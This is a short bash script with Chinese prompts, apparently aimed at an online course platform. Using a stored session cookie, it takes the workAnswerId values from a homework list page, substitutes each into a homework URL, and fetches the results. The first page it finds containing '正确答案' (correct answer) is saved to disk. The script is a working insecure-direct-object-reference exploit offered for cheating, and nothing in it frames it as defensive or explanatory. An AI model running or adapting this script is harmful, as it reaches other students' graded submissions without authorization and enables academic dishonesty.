read -p "旧版作业列表链接" listurl
read -p "输入你要提取答案的作业链接,也是旧版页面" url
list=$(curl -s -b cookies.txt $listurl | sed 's/&/\n/g' | grep "workAnswerId" | sed 's/=/\n/g' | grep [0-9] )
ori=$(echo $url |sed 's/&/\n/g'| grep 'workAnswerId=[0-9]'|cut -d'=' -f2)
url=$(echo $url | sed 's/mooc=1/mooc=0/g')
for i in $list
do
	tempurl=$(echo $url | sed "s/workAnswerId=$ori/workAnswerId=$i/g" )
	if [[ $(curl -s -b cookies.txt $tempurl) == *正确答案* ]];then
		echo "可能找到答案？？"
		curl -s -b cookies.txt $tempurl > "答案$i.html"
		exit
	fi
done
echo "找不到答案，你去遍历吧"



